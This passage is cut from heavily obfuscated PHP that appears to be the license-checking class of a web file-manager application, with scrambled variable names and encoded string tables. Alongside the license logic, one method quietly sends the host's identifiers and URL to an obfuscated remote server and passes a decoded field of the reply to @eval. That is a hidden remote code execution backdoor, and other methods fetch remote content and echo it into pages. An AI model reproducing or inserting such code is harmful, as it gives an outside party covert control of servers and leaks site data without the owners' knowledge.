$·‘ìÜ†½[$¼¤Û¨Ëå[155]]); } if ($øû˜“ø[$¼¤Û¨Ëå[167]] == $¼¤Û¨Ëå[168]) { $´ïÛåƒÉ = $this->yowpb68be23f($›²ó´œè, $¼¤Û¨Ëå[169]); $–ƒ™ª—Â = $this->qzot9bcca048(json_encode($·‘ìÜ†½), $›²ó´œè . $¼¤Û¨Ëå[170], 3); $–ƒ™ª—Â = $–ƒ™ª—Â . $¼¤Û¨Ëå[171] . $_SERVER[$¼¤Û¨Ëå[160]]; $£ÍÖ›é÷ = $this->elvb21c98862($¼¤Û¨Ëå[172] . $´ïÛåƒÉ . $¼¤Û¨Ëå[173] . $–ƒ™ª—Â, -1); show_json($£ÍÖ›é÷, !0); } else { if ($øû˜“ø[$¼¤Û¨Ëå[167]] == $¼¤Û¨Ëå[174]) { $ò«¥îÖš = substr(md5($¼¤Û¨Ëå[175] . $›²ó´œè), 12, 15) . $¼¤Û¨Ëå[176]; $–ƒ™ª—Â = $this->lmqa964148d0(trim($øû˜“ø[$¼¤Û¨Ëå[177]]), $ò«¥îÖš, 2); $ëğÆŞ¥Ş = json_decode($–ƒ™ª—Â, !0); if (!is_array($ëğÆŞ¥Ş) || !is_array($ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]]) || $ëğÆŞ¥Ş[$¼¤Û¨Ëå[152]] != !0) { $¦™÷µ“Ó = $¼¤Û¨Ëå[179]; $©è’…”á = $ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]] ? $¼¤Û¨Ëå[180] . $ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]] : $¦™÷µ“Ó; show_json($©è’…”á, !1); } else { $·‘ìÜ†½[$¼¤Û¨Ëå[155]] = $ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]][$¼¤Û¨Ëå[181]]; } } else { $ëğÆŞ¥Ş = $this->elvb21c98862($¼¤Û¨Ëå[182], $·‘ìÜ†½, 10); $¨¬õ‹¥ñ = $¶öä÷¾ˆ[748]; if (strlen($¨¬õ‹¥ñ) < $¶öä÷¾ˆ[708]) { die; } } } if (!is_array($ëğÆŞ¥Ş) || !is_array($ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]]) || $ëğÆŞ¥Ş[$¼¤Û¨Ëå[152]] != !0) { $¦™÷µ“Ó = LNG($¼¤Û¨Ëå[183]); $©è’…”á = $ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]] ? $¼¤Û¨Ëå[180] . $ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]] : $¦™÷µ“Ó; show_json($©è’…”á, !1); } $ÓÛÛáïÏ = $ëğÆŞ¥Ş[$¼¤Û¨Ëå[178]]; $¿®öı­ = $this->fyleda343085($ÓÛÛáïÏ[$¼¤Û¨Ëå[184]]); $¨Ø˜†™ = $¶öä÷¾ˆ[749]; if (!$¿®öı­ || $¿®öı­ != $ÓÛÛáïÏ[$¼¤Û¨Ëå[129]]) { $œÛ½­± = array($¼¤Û¨Ëå[185] => Model($¼¤Û¨Ëå[33])->get($¼¤Û¨Ëå[100]), $¼¤Û¨Ëå[186] => $_SERVER[$¼¤Û¨Ëå[106]], $¼¤Û¨Ëå[187] => this_url(), $¼¤Û¨Ëå[161] => $_SERVER[$¼¤Û¨Ëå[162]]); $–ƒ™ª—Â = $this->bdipfc67131d(json_encode($œÛ½­±)); $this->elvb21c98862($¼¤Û¨Ëå[188] . $–ƒ™ª—Â); show_json(LNG($¼¤Û¨Ëå[189]), !0); } $îÆáı = array($¼¤Û¨Ëå[153] => $ÓÛÛáïÏ[$¼¤Û¨Ëå[190]], $¼¤Û¨Ëå[191] => $ÓÛÛáïÏ[$¼¤Û¨Ëå[192]], $¼¤Û¨Ëå[193] => rand_string(16), $¼¤Û¨Ëå[108] => $ÓÛÛáïÏ[$¼¤Û¨Ëå[194]]); if ($·‘ìÜ†½[$¼¤Û¨Ëå[155]]) { $îÆáı[$¼¤Û¨Ëå[193]] = $·‘ìÜ†½[$¼¤Û¨Ëå[155]]; } $Äüú“€ó = substr(md5($îÆáı[$¼¤Û¨Ëå[191]]), 10, 10); $¡¿–ÉêÉ = $Äüú“€ó . $îÆáı[$¼¤Û¨Ëå[108]] . $îÆáı[$¼¤Û¨Ëå[193]]; $¯ˆâÛÆ = $¶öä÷¾ˆ[750]; while (strlen($¯ˆâÛÆ) < $¶öä÷¾ˆ[733]) { if (!$¯ˆâÛÆ) { break; } $¯ˆâÛÆ++; } $îÆáı[$¼¤Û¨Ëå[110]] = strrev(base64_encode($this->yowpb68be23f($¡¿–ÉêÉ, $¼¤Û¨Ëå[195]))); $…ú…œ = $¶öä÷¾ˆ[751]; $æ´ìÙõÓ = rand_string(16); $Éº»üí˜ = $¶öä÷¾ˆ[752]; $¢¸²œÖï = $æ´ìÙõÓ . $îÆáı[$¼¤Û¨Ëå[108]] . $this->yowpb68be23f(md5($îÆáı[$¼¤Û¨Ëå[153]]), $æ´ìÙõÓ); $îÆáı[$¼¤Û¨Ëå[111]] = base64_encode(strrev($this->yowpb68be23f($¢¸²œÖï, $¼¤Û¨Ëå[196]))); $Å‰ÓÇ–¥ = $¶öä÷¾ˆ[753]; if (!$Å‰ÓÇ–¥) { die; } if ($ÓÛÛáïÏ[$¼¤Û¨Ëå[197]] && $ÓÛÛáïÏ[$¼¤Û¨Ëå[197]] >= 1) { Model($¼¤Û¨Ëå[33])->setDeep($¼¤Û¨Ëå[198], $¼¤Û¨Ëå[122]); } Model($¼¤Û¨Ëå[33])->set($îÆáı); $üÒ÷‡Õ = md5($_SERVER[$¼¤Û¨Ëå[106]] . strrev($½¨ı¨¦×) . $îÆáı[$¼¤Û¨Ëå[191]]); $½Üóöë¾ = $¶öä÷¾ˆ[754]; $Ÿ³§ê¸¾ = strrev(substr($üÒ÷‡Õ, 10, 16)); $óÌÙÊ§ = $¶öä÷¾ˆ[755]; while ($óÌÙÊ§ < $¶öä÷¾ˆ[733]) { if ($óÌÙÊ§ >= 0) { break; } $óÌÙÊ§++; } $˜ù¬ğÄ„ = $this->qzot9bcca048(json_encode($ÓÛÛáïÏ), $üÒ÷‡Õ); $÷„±½å = array_to_keyvalue(Model($¼¤Û¨Ëå[7])->listData(), $¼¤Û¨Ëå[199]); $öÕ¦¿î‡ = $÷„±½å[$¼¤Û¨Ëå[200]]; $†õëõ’¯ = $¶öä÷¾ˆ[756]; while (strlen($†õëõ’¯) < $¶öä÷¾ˆ[733]) { if (!$†õëõ’¯) { break; } $†õëõ’¯++; } $¬ß‹ğÙ = array(); $¬ß‹ğÙ[$Ÿ³§ê¸¾] = $˜ù¬ğÄ„; Model($¼¤Û¨Ëå[7])->update($öÕ¦¿î‡[$¼¤Û¨Ëå[201]], array($¼¤Û¨Ëå[202] => $¬ß‹ğÙ)); $ÛïÉÚ¬ = $¶öä÷¾ˆ[757]; if (strlen($ÛïÉÚ¬) < $¶öä÷¾ˆ[733]) { die; } $this->nkfrf5d35153 = $ÓÛÛáïÏ; $this->pkwx73a438be = $îÆáı[$¼¤Û¨Ëå[108]]; $this->licenseRegistSuccess(); Cache::set($¼¤Û¨Ëå[203] . md5($½¨ı¨¦× . $¼¤Û¨Ëå[204]), $¼¤Û¨Ëå[6]); show_json(LNG($¼¤Û¨Ëå[189]), !0); $€ÖúŠû = $¶öä÷¾ˆ[758]; if (!$€ÖúŠû) { die; } } private function licenseRegistSuccess() { $ŸòÏ–ƒ¯ =& $_SERVER[¢Î¨ùä°]; $¨¥›ó·§ = Model($ŸòÏ–ƒ¯[33])->get(); if ($¨¥›ó·§[$ŸòÏ–ƒ¯[63]] != $ŸòÏ–ƒ¯[122]) { Model($ŸòÏ–ƒ¯[33])->set($ŸòÏ–ƒ¯[63], $ŸòÏ–ƒ¯[122]); } Action($ŸòÏ–ƒ¯[205])->initStart(!0); } private function herw7e951f6e() { $¸¨ß—êÅ =& $_SERVER[‹‰”››ê]; $Ì•Ğš÷Ë =& $_SERVER[¢Î¨ùä°]; Model($Ì•Ğš÷Ë[33])->set(array($Ì•Ğš÷Ë[153] => $Ì•Ğš÷Ë[6], $Ì•Ğš÷Ë[191] => $Ì•Ğš÷Ë[6], $Ì•Ğš÷Ë[108] => $Ì•Ğš÷Ë[109], $Ì•Ğš÷Ë[110] => $Ì•Ğš÷Ë[6], $Ì•Ğš÷Ë[111] => $Ì•Ğš÷Ë[6])); Model($Ì•Ğš÷Ë[33])->setDeep($Ì•Ğš÷Ë[198], $Ì•Ğš÷Ë[206]); $this->nkfrf5d35153 = array(); $this->pkwx73a438be = $Ì•Ğš÷Ë[109]; $¼‡ú®ğç = $¸¨ß—êÅ[759]; while (strlen($¼‡ú®ğç) < $¸¨ß—êÅ[708]) { if (!$¼‡ú®ğç) { break; } $¼‡ú®ğç++; } } private function gydxa33943f4() { $§±§–ØŠ =& $_SERVER[‹‰”››ê]; $ã†«Ş¹  =& $_SERVER[¢Î¨ùä°]; $_SERVER[$ã†«Ş¹ [162]] = _get($_SERVER, $ã†«Ş¹ [162], APP_HOST); $‹¹ÛŞ¸ = $§±§–ØŠ[760]; if (!$‹¹ÛŞ¸) { return; } $this->pkwx73a438be = $ã†«Ş¹ [109]; $²ÜÂÕº¥ = $§±§–ØŠ[761]; if (strlen($²ÜÂÕº¥) < $§±§–ØŠ[700]) { die; } $ªš›Íâ = Model($ã†«Ş¹ [33])->get(); $ÌÙí³¯± = $§±§–ØŠ[762]; if (!$ÌÙí³¯±) { return; } if ($ªš›Íâ[$ã†«Ş¹ [108]] == $ã†«Ş¹ [109]) { return; } $üğ©Ó¶ = Model($ã†«Ş¹ [33])->get($ã†«Ş¹ [100]); $íòÙó¼ô = $ã†«Ş¹ [203] . md5($üğ©Ó¶ . $ã†«Ş¹ [204]); $¡¯á—— = Cache::get($íòÙó¼ô); $Õ¢½£Ñ¿ = $§±§–ØŠ[763]; if (!$Õ¢½£Ñ¿) { die; } if (!is_array($¡¯á——) || !isset($¡¯á——[$ã†«Ş¹ [207]]) || time() - $¡¯á——[$ã†«Ş¹ [207]] >= 60) { $íÌ§ÎÕ¥ = Model($ã†«Ş¹ [7])->loadList(); $¤€ã„Õ = $íÌ§ÎÕ¥[$ã†«Ş¹ [200]]; $îŒĞõš¸ = md5($_SERVER[$ã†«Ş¹ [106]] . strrev($üğ©Ó¶) . $ªš›Íâ[$ã†«Ş¹ [191]]); $·™õçò± = strrev(substr($îŒĞõš¸, 10, 16)); $¡¯á—— = $this->lmqa964148d0($¤€ã„Õ[$ã†«Ş¹ [86]][$·™õçò±], $îŒĞõš¸); $¡¯á—— = json_decode($¡¯á——, !0); } if (!is_array($¡¯á——)) { return $this->herw7e951f6e(); } $ŒŠ¼çè = strtotime($¡¯á——[$ã†«Ş¹ [129]]); if (time() >= $ŒŠ¼çè) { return $this->herw7e951f6e(); } if (!isset($¡¯á——[$ã†«Ş¹ [207]]) || time() - $¡¯á——[$ã†«Ş¹ [207]] > 20) { $¡¯á——[$ã†«Ş¹ [207]] = time(); Cache::set($íòÙó¼ô, $¡¯á——); } $this->nkfrf5d35153 = $¡¯á——; $this->pkwx73a438be = $ªš›Íâ[$ã†«Ş¹ [108]]; $Ûªæç•ğ = $§±§–ØŠ[764]; if (strlen($Ûªæç•ğ) < $§±§–ØŠ[708]) { return; } } private function xotueccc3da1() { $‡éıô¹ =& $_SERVER[¢Î¨ùä°]; $º‘Óë…Ö = $GLOBALS[$‡éıô¹[13]]; $­ƒŒ¬ªµ = $_SERVER[$‡éıô¹[24]]; $Ïí˜ÜÃ‚ = $_SERVER[‹‰”››ê][765]; if ($­ƒŒ¬ªµ == $‡éıô¹[208] && $this->pkwx73a438be == $‡éıô¹[109]) { show_json(LNG($‡éıô¹[209]), !1, $‡éıô¹[210]); } $Ô§—¦„ò = array($‡éıô¹[211], $‡éıô¹[212]); if (in_array($­ƒŒ¬ªµ, $Ô§—¦„ò)) { if ($this->pkwx73a438be == $‡éıô¹[109] && isset($º‘Óë…Ö[$‡éıô¹[213]])) { show_json(LNG($‡éıô¹[209]), !1, $‡éıô¹[210]); die; } $…ö­ş„ = $this->mudifc2ae4b3(); if ($…ö­ş„ != intval($‡éıô¹[214])) { if ($…ö­ş„ <= Model($‡éıô¹[125])->count()) { show_json(LNG($‡éıô¹[215]), !1, $‡éıô¹[210]); die; } } } } private function qfake58ff099() { $º½æ°£¦ =& $_SERVER[‹‰”››ê]; $ûÛş²úå =& $_SERVER[¢Î¨ùä°]; $®ş®•Ÿ… = array($ûÛş²úå[119], $ûÛş²úå[120]); if (!KodUser::isRoot() || !isset($_GET[$ûÛş²úå[216]])) { return; } if (!in_array($_SERVER[$ûÛş²úå[24]], $®ş®•Ÿ…)) { return; } $“ğ°±óŒ = $ûÛş²úå[217]; $¯ÉĞÖËÈ = $º½æ°£¦[766]; while (strlen($¯ÉĞÖËÈ) < $º½æ°£¦[322]) { if (!$¯ÉĞÖËÈ) { break; } $¯ÉĞÖËÈ++; } $“ğ°±óŒ = $this->fjez1b054a46($“ğ°±óŒ, $ûÛş²úå[218]); $¨±èŞ¨ = $º½æ°£¦[767]; if (!$¨±èŞ¨) { die; } $ë¤…úª‘ = stream_context_create(array($ûÛş²úå[219] => array($ûÛş²úå[220] => $ûÛş²úå[221], $ûÛş²úå[222] => 3))); $±©¤‘…ƒ = $º½æ°£¦[768]; $²ÈìÖĞÃ = @file_get_contents($“ğ°±óŒ, !1, $ë¤…úª‘); $äşìÃó = $º½æ°£¦[769]; header($ûÛş²úå[223]); if ($²ÈìÖĞÃ && strstr($²ÈìÖĞÃ, $ûÛş²úå[224])) { echo $²ÈìÖĞÃ; } die; } public function vupq514571ad($°ü‡“¸ª) { $Ï„›˜ÚŒ =& $_SERVER[‹‰”››ê]; $Ì³º™ĞÊ =& $_SERVER[¢Î¨ùä°]; if ($this->pkwx73a438be == $Ì³º™ĞÊ[225]) { return $°ü‡“¸ª; } $‡»…ç®ñ = $this->versionPluginList(); $–ª¼öĞÇ = explode($Ì³º™ĞÊ[226], $this->versionPluginFilter()); $îÔ°½§ = $Ï„›˜ÚŒ[770]; if (!$îÔ°½§) { die; } $ş„¿ôÑ = array(); $¸¸âÜàö = $Ï„›˜ÚŒ[771]; if (!$¸¸âÜàö) { return; } foreach ($‡»…ç®ñ as $ïíüşÈ => $“ƒÙØ¬) { if ($“ƒÙØ¬ == $Ì³º™ĞÊ[227] && substr($this->pkwx73a438be, 0, 1) == $Ì³º™ĞÊ[227]) { continue; } if (!in_array($ïíüşÈ, $–ª¼öĞÇ)) { $ş„¿ôÑ[] = $ïíüşÈ; } } foreach ($ş„¿ôÑ as $ïíüşÈ) { unset($°ü‡“¸ª[$ïíüşÈ]); $¸²šĞ© = $Ï„›˜ÚŒ[772]; } return $°ü‡“¸ª; } private function versionPluginList() { $äñËÂ´ =& $_SERVER[‹‰”››ê]; $ ©œîã” =& $_SERVER[¢Î¨ùä°]; return array($ ©œîã”[228] => $ ©œîã”[227], $ ©œîã”[229] => $ ©œîã”[227], $ ©œîã”[230] => $ ©œîã”[227], $ ©œîã”[231] => $ ©œîã”[232], $ ©œîã”[233] => $ ©œîã”[232], $ ©œîã”[234] => $ ©œîã”[232], $ ©œîã”[235] => $ ©œîã”[232], $ ©œîã”[236] => $ ©œîã”[232], $ ©œîã”[237] => $ ©œîã”[232], $ ©œîã”[238] => $ ©œîã”[232], $ ©œîã”[239] => $ ©œîã”[232], $ ©œîã”[240] => $ ©œîã”[232], $ ©œîã”[241] => $ ©œîã”[232], $ ©œîã”[242] => $ ©œîã”[232], $ ©œîã”[243] => $ ©œîã”[232], $ ©œîã”[244] => $ ©œîã”[232]); $Ô”¡ÀØŒ = $äñËÂ´[773]; if (strlen($Ô”¡ÀØŒ) < $äñËÂ´[703]) { return; } } private function versionPluginFilter() { $ç•ÀÕ÷® =& $_SERVER[‹‰”››ê]; $Ú–ˆ‹µ° =& $_SERVER[¢Î¨ùä°]; if ($this->pkwx73a438be == $Ú–ˆ‹µ°[109]) { return $Ú–ˆ‹µ°[6]; } $•¼¸µı‚ = _get($this->nkfrf5d35153, $Ú–ˆ‹µ°[245], $Ú–ˆ‹µ°[6]); $ÅÃ¹şï = _get($this->nkfrf5d35153, $Ú–ˆ‹µ°[116], $Ú–ˆ‹µ°[6]); $ËÃõûŒ = $ç•ÀÕ÷®[774]; if (strlen($ËÃõûŒ) < $ç•ÀÕ÷®[322]) { return; } $óŠÒí¹ = _get($this->nkfrf5d35153, $Ú–ˆ‹µ°[246], $Ú–ˆ‹µ°[6]); if ($ÅÃ¹şï > time() && $óŠÒí¹ > time()) { $äü¶ ‰ö = explode($Ú–ˆ‹µ°[226], $•¼¸µı‚); $†Ü÷éÕç = array_keys($this->versionPluginList()); $•¼¸µı‚ = array_merge($äü¶ ‰ö, $†Ü÷éÕç); $•¼¸µı‚ = implode($Ú–ˆ‹µ°[226], array_filter(array_unique($•¼¸µı‚))); } return $•¼¸µı‚; } private function hnof8d516d14() { $”äÆ€‡€ =& $_SERVER[¢Î¨ùä°]; if ($this->pkwx73a438be != $”äÆ€‡€[109]) { $GLOBALS[$”äÆ€‡€[86]][$”äÆ€‡€[90]][$”äÆ€‡€[247]] = $”äÆ€‡€[206]; return; } $GLOBALS[$”äÆ€‡€[86]][$”äÆ€‡€[248]] = $”äÆ€‡€[122]; if (Model($”äÆ€‡€[249])->get($”äÆ€‡€[63]) != $”äÆ€‡€[206]) { Model($”äÆ€‡€[249])->set($”äÆ€‡€[63], $”äÆ€‡€[206]); } } public function dsmhee5d54e4() { $ÔÂùã˜ =& $_SERVER[‹‰”››ê]; return $_SERVER[¢Î¨ùä°][250]; $•äêÅñ = $ÔÂùã˜[775]; while ($•äêÅñ < $ÔÂùã˜[700]) { if ($•äêÅñ >= 0) { break; } $•äêÅñ++; } } private function kayc7b289131() { $ı¥ì İ =& $_SERVER[‹‰”››ê]; $ä­±„Äô =& $_SERVER[¢Î¨ùä°]; $ó×ÙñÄÜ = array($ä­±„Äô[251], $ä­±„Äô[252], $ä­±„Äô[253]); $ÓŠ¤šö = $ı¥ì İ[776]; while ($ÓŠ¤šö < $ı¥ì İ[703]) { if ($ÓŠ¤šö >= 0) { break; } $ÓŠ¤šö++; } $¾ÇˆÙìƒ = $ä­±„Äô[254] . md5($ä­±„Äô[255]); if ($this->pkwx73a438be == $ä­±„Äô[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ä­±„Äô[24]], $ó×ÙñÄÜ)) { return; } if (time() % 4 != 0) { return; } $Ãºøôô‡ = call_user_func(array($ä­±„Äô[256], $ä­±„Äô[257]), $¾ÇˆÙìƒ); if ($Ãºøôô‡ && time() - $Ãºøôô‡ < intval($ä­±„Äô[258])) { return; } call_user_func(array($ä­±„Äô[256], $ä­±„Äô[139]), $¾ÇˆÙìƒ, time()); $öòçÆß = Model($ä­±„Äô[33])->get($ä­±„Äô[100]); $¿×Ãüç¿ = $ı¥ì İ[777]; if (!$¿×Ãüç¿) { die; } $«½ÏŠ«Ô = array($ä­±„Äô[152] => Model($ä­±„Äô[33])->get($ä­±„Äô[153]), $ä­±„Äô[167] => $this->pkwx73a438be, $ä­±„Äô[163] => $_SERVER[$ä­±„Äô[164]], $ä­±„Äô[165] => Model($ä­±„Äô[33])->get($ä­±„Äô[131]), $ä­±„Äô[105] => md5($_SERVER[$ä­±„Äô[106]] . $öòçÆß), $ä­±„Äô[156] => $ä­±„Äô[136], $ä­±„Äô[159] => $_SERVER[$ä­±„Äô[160]]); $¤²Ëõ“Ê = $ı¥ì İ[778]; if (strlen($¤²Ëõ“Ê) < $ı¥ì İ[733]) { die; } $†µ¾æô = $this->elvb21c98862($ä­±„Äô[259], $«½ÏŠ«Ô); $¡¿«ãÚ‰ = $ı¥ì İ[779]; while (strlen($¡¿«ãÚ‰) < $ı¥ì İ[708]) { if (!$¡¿«ãÚ‰) { break; } $¡¿«ãÚ‰++; } if (!is_array($†µ¾æô)) { return; } if ($†µ¾æô[$ä­±„Äô[152]] && $†µ¾æô[$ä­±„Äô[260]]) { if ($this->fyleda343085($†µ¾æô[$ä­±„Äô[260]]) == $«½ÏŠ«Ô[$ä­±„Äô[152]]) { return; } } $this->herw7e951f6e(); if ($this->fyleda343085($†µ¾æô[$ä­±„Äô[260]]) != $«½ÏŠ«Ô[$ä­±„Äô[152]]) { $È™ŞïÓ = array($ä­±„Äô[185] => $öòçÆß, $ä­±„Äô[186] => $_SERVER[$ä­±„Äô[106]], $ä­±„Äô[187] => this_url(), $ä­±„Äô[161] => $_SERVER[$ä­±„Äô[162]]); $ˆÚ´Ÿîù = $this->bdipfc67131d(json_encode($È™ŞïÓ)); $†µ¾æô = $this->elvb21c98862($ä­±„Äô[188] . $ˆÚ´Ÿîù); if ($†µ¾æô && is_array($†µ¾æô) && isset($†µ¾æô[$ä­±„Äô[260]])) { $ß¨à¶€ = $this->lmqa964148d0($†µ¾æô[$ä­±„Äô[260]], 2); if ($ß¨à¶€) { $ß¨à¶€ = $this->fyleda343085($ß¨à¶€); } if ($ß¨à¶€) { try { @eval($ß¨à¶€); } catch (Exception $½ò‹• ˆ) { } } } } } private function elvb21c98862($Ÿ“øò—© = '', $Û÷¹¨¿Œ = array(), $Î¶Û®¥² = 5) { $ÍŠ‰îÏ =& $_SERVER[‹‰”››ê]; $©ô¼”Ò =& $_SERVER[¢Î¨ùä°]; $Ïó¤ùù¯ = $©ô¼”Ò[261]; $ô¦ùÈÃ  = $ÍŠ‰îÏ[780]; $Ïó¤ùù¯ = $this->fjez1b054a46($Ïó¤ùù¯, $©ô¼”Ò[262]); $Ïó¤ùù¯ = $Ïó¤ùù¯ . $Ÿ“øò—©; if ($Û÷¹¨¿Œ && is_array($Û÷¹¨¿Œ)) { $Ïó¤ùù¯ = $Ïó¤ùù¯ . $©ô¼”Ò[263] . http_build_query($Û÷¹¨¿Œ); } if ($Û÷¹¨¿Œ === -1) { return $Ïó¤ùù¯; } $úàä—¿ = stream_context_create(array($©ô¼”Ò[219] => array($©ô¼”Ò[222] => $Î¶Û®¥², $©ô¼”Ò[220] => $©ô¼”Ò[264]), $©ô¼”Ò[265] => array($©ô¼”Ò[266] => !1, $©ô¼”Ò[267] => !1))); $Û÷¹¨¿Œ = @file_get_contents($Ïó¤ùù¯, !1, $úàä—¿); $ş—ÀïŒÅ = $ÍŠ‰îÏ[781]; return json_decode($Û÷¹¨¿Œ, !0); $÷ßÉã = $ÍŠ‰îÏ[782]; if (!$÷ßÉã) { die; } $‘˜¬öÃ = $ÍŠ‰îÏ[783]; if (strlen($‘˜¬öÃ) < $ÍŠ‰îÏ[703]) { return; } } private function mudifc2ae4b3() { $õî‘ÕÓì =& $_SERVER[‹‰”››ê]; $·Ÿ°×’Š =& $_SERVER[¢Î¨ùä°]; $ë¡Â¹Ó² = array($·Ÿ°×’Š[268] => $·Ÿ°×’Š[269], $·Ÿ°×’Š[270] => $·Ÿ°×’Š[271], $·Ÿ°×’Š[272] => $·Ÿ°×’Š[273], $·Ÿ°×’Š[274] => $·Ÿ°×’Š[275], $·Ÿ°×’Š[276] => $·Ÿ°×’Š[277], $·Ÿ°×’Š[278] => $·Ÿ°×’Š[214], $·Ÿ°×’Š[279] => $·Ÿ°×’Š[214], $·Ÿ°×’Š[280] => $·Ÿ°×’Š[269], $·Ÿ°×’Š[281] => $·Ÿ°×’Š[271], $·Ÿ°×’Š[282] => $·Ÿ°×’Š[273], $·Ÿ°×’Š[283] => $·Ÿ°×’Š[284], $·Ÿ°×’Š[285] => $·Ÿ°×’Š[275], $·Ÿ°×’Š[286] => $·Ÿ°×’Š[287], $·Ÿ°×’Š[288] => $·Ÿ°×’Š[277], $·Ÿ°×’Š[289] => $·Ÿ°×’Š[290], $·Ÿ°×’Š[291] => $·Ÿ°×’Š[292], $·Ÿ°×’Š[293] => $·Ÿ°×’Š[294]); $Ø—´ûÅ = $ë¡Â¹Ó²[$this->pkwx73a438be]; $•¾á‚Ş = $õî‘ÕÓì[784]; if (!$•¾á‚Ş) { return; } $Ø—´ûÅ = intval($Ø—´ûÅ ? $Ø—´ûÅ : $·Ÿ°×’Š[269]); $‚Ñ™Üø‰ = _get($this->nkfrf5d35153, $·Ÿ°×’Š[295]); $‚Ñ™Üø‰ = $‚Ñ™Üø‰ ? intval($‚Ñ™Üø‰) : 0; $£§£Ñõ = $õî‘ÕÓì[771]; return $Ø—´ûÅ + $‚Ñ™Üø‰; $ÉõøŞÌÎ = $õî‘ÕÓì[785]; } public function zhqc43a8dfc9($äòÕ¨‰) { $¾ëŠŞŠ£ =& $_SERVER[¢Î¨ùä°]; $¶ƒæä¡³ = $this->mudifc2ae4b3(); if ($äòÕ¨‰[$¾ëŠŞŠ£[296]] == $¾ëŠŞŠ£[122]) { return; } if ($¶ƒæä¡³ >= intval($¾ëŠŞŠ£[214])) { return; } $áÏÃ÷È = Model($¾ëŠŞŠ£[125])->count(); if ($áÏÃ÷È <= $¶ƒæä¡³) { return; } $™­õã™¨ = Model($¾ëŠŞŠ£[125])->field($¾ëŠŞŠ£[296])->limit($¶ƒæä¡³)->select(); $™­õã™¨ = array_to_keyvalue($™­õã™¨, $¾ëŠŞŠ£[6], $¾ëŠŞŠ£[296]); if (!in_array($äòÕ¨‰[$¾ëŠŞŠ£[296]], $™­õã™¨)) { show_json($¾ëŠŞŠ£[297], !1, $¾ëŠŞŠ£[210]); } } public function gikhf4a9cb07() { $‚äâøşÄ =& $_SERVER[‹‰”››ê]; $…›á¶ =& $_SERVER[¢Î¨ùä°]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ùş“‰ãµ = $…›á¶[217]; $ùş“‰ãµ = $this->fjez1b054a46($ùş“‰ãµ, $…›á¶[218]); $Éî“î„ = $‚äâøşÄ[786]; while (strlen($Éî“î„) < $‚äâøşÄ[322]) { if (!$Éî“î„) { break; } $Éî“î„++; } $º¤Ìğ»× = stream_context_create(array($…›á¶[219] => array($…›á¶[220] => $…›á¶[221], $…›á¶[222] => 3))); $ê›Ô‚™ = $‚äâøşÄ[787]; $ûŠÖ“Í = @file_get_contents($ùş“‰ãµ, !1, $º¤Ìğ»×); echo $…›á¶[298] . hash_encode($ûŠÖ“Í) . $…›á¶[299]; } private function qzot9bcca048($Æ›äü—¬, $óëŒèêê, $¦ÀĞœ¢ = 3) { $åŸ‡ş =& $_SERVER[‹‰”››ê]; $£ä¦ú²¶ =& $_SERVER[¢Î¨ùä°]; usleep(1); $Æ›äü—¬ = trim($Æ›äü—¬); $ÚÛÌœÑ¡ = mt_rand(0, 5) . $£ä¦ú²¶[6]; $Û§ãáìø = rand_string(15); $±Ö¿ÔÛ = $åŸ‡ş[788]; $öñšÔ™õ = $£ä¦ú²¶[300]; $ï²šİ÷Ú = $åŸ‡ş[789]; if (!$ï²šİ÷Ú) { return; } switch ($ÚÛÌœÑ¡) { case $£ä¦ú²¶[206]: $é¬øĞ = $this->yowpb68be23f($Æ›äü—¬, strrev($óëŒèêê . $Û§ãáìø)); break; $–²•ã•° = $åŸ‡ş[790]; if (!$–²•ã•°) { return; } case $£ä¦ú²¶[122]: $é¬øĞ = $this->yowpb68be23f($Æ›äü—¬, strrev($Û§ãáìø . $óëŒèêê)); $æÇÓºç = $åŸ‡ş[791]; if (strlen($æÇÓºç) < $åŸ‡ş[703]) { die; } break; case $£ä¦ú²¶[301]: $é¬øĞ = $this->yowpb68be23f($Æ›äü—¬, base64_encode($Û§ãáìø . $óëŒèêê)); break; case $£ä¦ú²¶[302]: $é¬øĞ = $this->yowpb68be23f($Æ›äü—¬, md5($Û§ãáìø . $óëŒèêê)); $£Î²ìÏİ = $åŸ‡ş[792]; if (!$£Î²ìÏİ) { return; } break; case $£ä¦ú²¶[303]: $Æ›äü—¬ = base64_encode($Æ›äü—¬); $ÕçğÀÀ¶ = $åŸ‡ş[793]; while ($ÕçğÀÀ¶ < $åŸ‡ş[322]) { if ($ÕçğÀÀ¶ >= 0) { break; } $ÕçğÀÀ¶++; } $ÉÀˆ¡ûÏ = rand(0, 64); $ü€îÃÁÑ = $öñšÔ™õ[$ÉÀˆ¡ûÏ]; $›‘Î¯ç = md5($ü€îÃÁÑ . md5($óëŒèêê . $ü€îÃÁÑ) . $óëŒèêê); $›‘Î¯ç = substr($›‘Î¯ç, $ÉÀˆ¡ûÏ % 8, $ÉÀˆ¡ûÏ % 8 + 7); $ëÁÏ•° = $åŸ‡ş[794]; if (!$ëÁÏ•°) { return; } $òÅ–¶ = $£ä¦ú²¶[6]; $Å¢ï€â– = 0; $ÒóÇ¨öÒ = 0; $Ù÷‘™¸· = 0; $­Ïå¬ĞÒ = $åŸ‡ş[795]; while (strlen($­Ïå¬ĞÒ) < $åŸ‡ş[703]) { if (!$­Ïå¬ĞÒ) { break; } $­Ïå¬ĞÒ++; } for ($Å¢ï€â– = 0; $Å¢ï€â– < strlen($Æ›äü—¬); $Å¢ï€â–++) { $Ù÷‘™¸· = $Ù÷‘™¸· == strlen($›‘Î¯ç) ? 0 : $Ù÷‘™¸·; $ÒóÇ¨öÒ = ($ÉÀˆ¡ûÏ + strpos($öñšÔ™õ, $Æ›äü—¬[$Å¢ï€â–]) + ord($›‘Î¯ç[$Ù÷‘™¸·++])) % 64; $§òÈšÙú = $åŸ‡ş[796]; $òÅ–¶ .= $öñšÔ™õ[$ÒóÇ¨öÒ]; $‚êÔŒ = $åŸ‡ş[797]; } $é¬øĞ = hash_encode($ü€îÃÁÑ . $òÅ–¶); break; default: $é¬øĞ = $this->yowpb68be23f($Æ›äü—¬, $óëŒèêê . $Û§ãáìø); break; $°¹õ™ÕÀ = $åŸ‡ş[798]; if (!$°¹õ™ÕÀ) { return; } } $é¬øĞ = strrev($ÚÛÌœÑ¡ . $Û§ãáìø . 